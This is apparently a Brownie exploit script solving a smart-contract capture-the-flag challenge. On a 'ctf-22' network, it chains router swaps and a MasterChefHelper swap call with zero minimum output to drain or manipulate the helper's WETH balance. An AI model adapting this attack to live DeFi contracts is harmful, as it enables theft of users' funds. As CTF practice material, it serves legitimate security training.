import os

from brownie import network

from . import MasterChefHelper, UniswapV2RouterLike, WETH9

WETH_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
ROUTER_ADDRESS = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F"
INTERMEDIATE_TOKEN_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
FINAL_POOL_ID = "0"
FINAL_POOL_TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"

MC_HELPER_ADDRESS = os.environ.get("MC_HELPER_ADDRESS")

network.connect("ctf-22")
account = network.accounts.load("ctf-22", "p")
tx_config = {"from": account}

mc_helper = MasterChefHelper.MasterChefHelper(MC_HELPER_ADDRESS)
router = UniswapV2RouterLike.UniswapV2RouterLike(ROUTER_ADDRESS)
weth = WETH9.WETH9(WETH_ADDRESS)
intermediate_token = WETH9.WETH9(INTERMEDIATE_TOKEN_ADDRESS)
final_token = WETH9.WETH9(FINAL_POOL_TOKEN_ADDRESS)

# Get 40 WETH
# weth.deposit({**tx_config, "value": 40000000000000000000})

# weth.approve(router.address, 2**256 - 1, tx_config)
# router.swap_exact_tokens_for_tokens(40000000000000000000, 0, [WETH_ADDRESS, FINAL_POOL_TOKEN_ADDRESS], account.address, 99999999999999999999999999999999999999999999999, tx_config)
final_token_balance = final_token.balance_of(account.address)
final_token.approve(router.address, 2**256 - 1, tx_config)
router.swap_exact_tokens_for_tokens(final_token_balance, 0, [FINAL_POOL_TOKEN_ADDRESS, INTERMEDIATE_TOKEN_ADDRESS], account.address, 99999999999999999999999999999999999999999999999, tx_config)

intermediate_token_balance = intermediate_token.balance_of(account.address)

intermediate_token.approve(mc_helper.address, 2**256 - 1, tx_config)
mc_helper.swap_token_for_pool_token(FINAL_POOL_ID, INTERMEDIATE_TOKEN_ADDRESS, intermediate_token_balance, 0, tx_config)

print(weth.balance_of(MC_HELPER_ADDRESS))
